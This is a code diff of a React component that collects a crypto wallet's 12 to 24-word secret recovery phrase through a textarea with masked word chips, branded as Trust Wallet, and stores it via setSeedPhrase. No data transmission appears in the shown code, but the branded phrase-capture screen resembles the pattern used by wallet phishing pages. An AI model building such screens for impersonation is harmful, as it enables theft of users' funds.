@@ -6,16 +6,36 @@ import { Input } from "@/components/ui/input";
 import { useWalletStore } from "@/store/walletStore";
 import TrustWalletFull from "../icons/trust-wallet-full";
 
+const MAX_WORDS = 24;
+const REQUIRED_WORDS = 12;
+
 const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
   const [walletName, setWalletName] = useState("Main wallet");
-  // START WITH NO INPUTS — tapping creates the first one
-  const [words, setWords] = useState<string[]>([]);
-  const [visibility, setVisibility] = useState<boolean[]>([]);
+  const [rawText, setRawText] = useState(""); // full textarea content
+  const [visibility, setVisibility] = useState<boolean[]>([]); // per-word visibility not used now; keep for compatibility
   const [allVisible, setAllVisible] = useState(false);
   const [nameFocused, setNameFocused] = useState(false);
   const [areaFocused, setAreaFocused] = useState(false);
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const textareaRef = useRef<HTMLTextAreaElement | null>(null);
   const { setSeedPhrase } = useWalletStore();
+
+  // Utility: convert rawText into trimmed words array (limit to MAX_WORDS)
+  const getWords = (text = rawText) =>
+    text
+      .trim()
+      .split(/\s+/)
+      .filter(Boolean)
+      .slice(0, MAX_WORDS);
+
+  const words = getWords();
+
+  // keep visibility array in sync length-wise (not strictly required but preserved)
+  if (visibility.length !== words.length) {
+    // avoid state setter during render — only fast sync for UI mapping by creating a local array
+    const newVis = Array(words.length).fill(allVisible);
+    // do not call setVisibility here to avoid re-render loops; we'll update when toggling visibility.
+    // (visibility only matters for rendering masked/unmasked, and allVisible controls mask.)
+  }
 
   // Handle completion
   const handleComplete = () => {
@@ -23,105 +43,69 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
     handleFinish();
   };
 
-  // Add a new input automatically (now focuses reliably)
-  const addNewInput = (focusIndex?: number) => {
-    setWords((prev) => {
-      if (prev.length >= 24) return prev;
-      const next = [...prev, ""];
-      // keep visibility array in sync
-      setVisibility((vPrev) => {
-        const nextVis = [...(vPrev || []), false];
-        return nextVis;
-      });
-      // focus newly added input after DOM update
-      setTimeout(() => {
-        const idxToFocus = typeof focusIndex === "number" ? focusIndex : next.length - 1;
-        inputRefs.current[idxToFocus]?.focus();
-      }, 10);
-      return next;
-    });
-  };
-
-  // Handle typing within each input (keyboard only)
-  const handleKeyDown = (
-    e: React.KeyboardEvent<HTMLInputElement>,
-    index: number
-  ) => {
-    if (e.key === " ") {
-      // Desktop space key behaviour: prevent the space and add new input if word exists
-      e.preventDefault();
-      if (words[index]?.trim() !== "") addNewInput();
-    } else if (e.key === "Backspace" && words[index] === "" && index > 0) {
-      // remove current empty input and focus previous
-      e.preventDefault();
-      setWords((prev) => {
-        const next = prev.filter((_, i) => i !== index);
-        setVisibility((vPrev) => vPrev.filter((_, i) => i !== index));
-        setTimeout(() => {
-          inputRefs.current[index - 1]?.focus();
-        }, 10);
-        return next;
-      });
-    }
-  };
-
-  // Handle input change (works for both desktop & mobile)
-  const handleInput = (e: React.FormEvent<HTMLInputElement>, index: number) => {
-    const value = e.currentTarget.value;
-
-    // If a space was typed (mobile-friendly) - commit trimmed word and add a new input
-    if (value.endsWith(" ")) {
-      const trimmed = value.trim();
-      setWords((prev) => {
-        const next = prev.map((w, i) => (i === index ? trimmed : w));
-        // if trimmed isn't empty, add new input
-        if (trimmed !== "" && next.length < 24) {
-          const withExtra = [...next, ""];
-          setVisibility((vPrev) => [...(vPrev || []), false]);
-          setTimeout(() => {
-            inputRefs.current[withExtra.length - 1]?.focus();
-          }, 10);
-          return withExtra;
-        }
-        return next;
-      });
-      return;
-    }
-
-    // Normal typing: update value for that index
-    setWords((prev) => prev.map((w, i) => (i === index ? value : w)));
-  };
-
   // Toggle all visibility
   const toggleAllVisibility = () => {
-    const newVisible = !allVisible;
-    setAllVisible(newVisible);
-    setVisibility((prev) => (prev.length ? prev.map(() => newVisible) : []));
+    const nv = !allVisible;
+    setAllVisible(nv);
+    setVisibility((prev) => Array(getWords().length).fill(nv));
   };
 
-  // Handle area click / touch (robust for iOS)
-  const handleAreaClick = (e?: React.MouseEvent<HTMLDivElement> | undefined) => {
-    // If user tapped an existing input or button, don't override
+  // Focus / create first input (textarea) when area tapped
+  const handleAreaClick = (e?: React.MouseEvent<HTMLDivElement>) => {
+    // if clicked on a button inside area, ignore
     if (e) {
       const target = e.target as HTMLElement;
-      if (target.closest("input") || target.closest("button")) return;
+      if (target.closest("button")) return;
     }
+    textareaRef.current?.focus();
+    // On very first tap (empty), put caret at end (no extra actions needed)
+  };
 
-    // If no inputs exist, create the first input and focus it
-    if (words.length === 0) {
-      addNewInput(0);
+  // textarea input handler — keep rawText and enforce max words/trim
+  const handleTextChange = (e: React.FormEvent<HTMLTextAreaElement>) => {
+    const t = (e.currentTarget.value ?? "") as string;
+
+    // If there are more than MAX_WORDS, truncate to MAX_WORDS
+    const split = t.trimStart().split(/\s+/).filter(Boolean);
+    if (split.length > MAX_WORDS) {
+      // rebuild string from first MAX_WORDS preserving spaces between words
+      const limited = split.slice(0, MAX_WORDS).join(" ");
+      setRawText(limited + (t.endsWith(" ") ? " " : ""));
       return;
     }
 
-    // Otherwise focus the last input
+    setRawText(t);
+  };
+
+  // handle paste: clean up and paste trimmed to MAX_WORDS
+  const handlePaste = async (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
+    const paste = e.clipboardData.getData("text") ?? "";
+    if (!paste) return;
+
+    e.preventDefault();
+
+    // normalize whitespace and limit words
+    const pastedWords = paste.trim().split(/\s+/).filter(Boolean).slice(0, MAX_WORDS);
+    const newText = pastedWords.join(" ") + (paste.endsWith(" ") ? " " : "");
+    setRawText(newText);
+
+    // focus at end
     setTimeout(() => {
-      inputRefs.current[words.length - 1]?.focus();
+      if (textareaRef.current) {
+        textareaRef.current.selectionStart = textareaRef.current.selectionEnd = newText.length;
+        textareaRef.current.focus();
+      }
     }, 10);
   };
 
-  // Disable button logic
-  const isButtonDisabled =
-    !walletName.trim() || words.length === 0 || words.every((w) => w.trim() === "");
+  // keyboard handling for "Enter" or other keys is handled naturally by textarea;
+  // we keep backspace & space handling implicit since words are derived from the textarea.
+
+  const filledCount = words.filter((w) => w.trim() !== "").length;
+  const isButtonDisabled = !walletName.trim() || words.length === 0 || filledCount < REQUIRED_WORDS;
+
+  // Utility to render a masked version of a word (same length as original but using •)
+  const maskWord = (w: string) => w.replace(/./g, "•");
 
   return (
     <div className="min-h-screen bg-black flex text-gray-300 w-full">
@@ -169,60 +153,69 @@ const TrustWallet = ({ handleFinish }: { handleFinish: () => void }) => {
               </label>
 
               <div
-                // both click and touchstart so iOS reliably triggers focus/create-first-input
                 onClick={handleAreaClick}
                 onTouchStart={() => handleAreaClick()}
-                className={`relative flex flex-wrap rounded-lg p-4 min-h-56 cursor-text transition-colors ${
+                className={`relative rounded-lg p-4 min-h-56 cursor-text transition-colors ${
                   areaFocused ? "border-1 border-green-600" : "border border-neutral-700"
                 } bg-neutral-900`}
               >
-                {/* If there are no inputs yet, show a tappable placeholder */}
-                {words.length === 0 ? (
-                  <div
-                    onClick={handleAreaClick}
-                    className="text-sm text-gray-400 select-none"
-                    role="button"
-                    aria-label="tap-to-start"
-                  >
-                    Tap here to start typing your secret phrase or paste it
-                  </div>
-                ) : (
-                  // render inputs
-                  words.map((word, index) => (
-                    <div key={index} className="mr-2 mb-2 flex items-center">
-                      <input
-                        ref={(el) => {
-                          if (el) inputRefs.current[index] = el;
-                        }}
-                        type={visibility[index] ? "text" : "password"}
-                        value={word}
-                        onInput={(e) => handleInput(e as any, index)}
-                        onKeyDown={(e) => handleKeyDown(e, index)}
-                        inputMode="text"
-                        autoCapitalize="none"
-                        autoCorrect="off"
-                        spellCheck="false"
-                        enterKeyHint="next"
-                        onFocus={() => setAreaFocused(true)}
-                        onBlur={() => setAreaFocused(false)}
-                        // make input easier to tap on mobile
-                        style={{
-                          minWidth: "3ch",
-                          width: `${Math.max(word.length, 1)}ch`,
-                          padding: "6px 8px",
-                          borderRadius: 6,
-                        }}
-                        className="bg-transparent outline-none text-gray-100/80 font-semibold"
-                        aria-label={`secret-word-${index + 1}`}
-                      />
-                    </div>
-                  ))
-                )}
+                {/* TEXTAREA: plain, mobile-friendly input surface */}
+                <textarea
+                  ref={textareaRef}
+                  value={rawText}
+                  onInput={handleTextChange}
+                  onPaste={handlePaste}
+                  onFocus={() => setAreaFocused(true)}
+                  onBlur={() => setAreaFocused(false)}
+                  className="w-full h-full resize-none bg-transparent outline-none text-transparent caret-white placeholder:text-gray-500"
+                  placeholder="Tap to start typing or paste your secret phrase here"
+                  autoCapitalize="none"
+                  autoCorrect="off"
+                  spellCheck={false}
+                  inputMode="text"
+                  aria-label="secret-phrase-textarea"
+                  style={{
+                    // Make the textarea fill the container but keep text invisible,
+                    // we'll render the visible (or masked) words below as chips.
+                    minHeight: 140,
+                    padding: 0,
+                    margin: 0,
+                    // keep caret visible: set caret color explicitly
+                    caretColor: "white",
+                  }}
+                />
 
+                {/* Overlay: chips view that mirrors words — masked or visible */}
+                <div className="pointer-events-none mt-2">
+                  {/* We show chips in 3 columns like original, so use flex-wrap */}
+                  <div className="flex flex-wrap gap-3">
+                    {words.length === 0 ? (
+                      <div className="text-sm text-gray-400 select-none">
+                        Tap here to start typing your secret phrase or paste it
+                      </div>
+                    ) : (
+                      words.map((w, idx) => (
+                        <div
+                          key={idx}
+                          className="flex items-center gap-2 bg-black border border-gray-100/10 rounded-lg px-2 py-1 h-fit"
+                        >
+                          <span className="text-neutral-400 w-4 text-right font-medium whitespace-nowrap">
+                            {idx + 1}.
+                          </span>
+                          <span className="text-neutral-100 text-sm font-semibold">
+                            {allVisible ? w : maskWord(w)}
+                          </span>
+                        </div>
+                      ))
+                    )}
+                  </div>
+                </div>
+
+                {/* Eye toggle */}
                 <button
                   type="button"
                   onClick={toggleAllVisibility}
-                  className="absolute bottom-3 right-3 text-gray-400 hover:text-gray-200 transition"
+                  className="absolute bottom-3 right-3 text-gray-400 hover:text-gray-200 transition pointer-events-auto"
                   aria-label={allVisible ? "hide all" : "show all"}
                 >
                   {allVisible ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
